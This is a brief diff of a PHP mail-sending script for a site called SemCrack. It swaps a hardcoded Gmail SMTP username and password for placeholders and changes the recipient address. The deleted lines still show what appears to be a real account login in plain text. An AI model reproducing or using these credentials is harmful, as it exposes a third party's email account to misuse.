@@ -11,12 +11,12 @@ if(isset($_POST['mail'])){
       $mail->isSMTP();                                     
       $mail->Host = 'smtp.gmail.com';
       $mail->SMTPAuth = true; 
-      $mail->Username = 'semcrack17@gmail.com';                 
-      $mail->Password = 'Semcrack@17';                           
+      $mail->Username = 'Your Email';                 
+      $mail->Password = 'Your Password';                           
       $mail->SMTPSecure = 'ssl'; 
       $mail->Port = 465;  
       $mail->setFrom("support@semcrack.com", "SemCrack");
-      $mail->addAddress('820121223505e@gmail.com');   
+      $mail->addAddress('support@semcrack.com');   
       $mail->addReplyTo("support@semcrack.com", "SemCrack");
       $mail->isHTML(true);                     
       $mail->Subject = "Update";
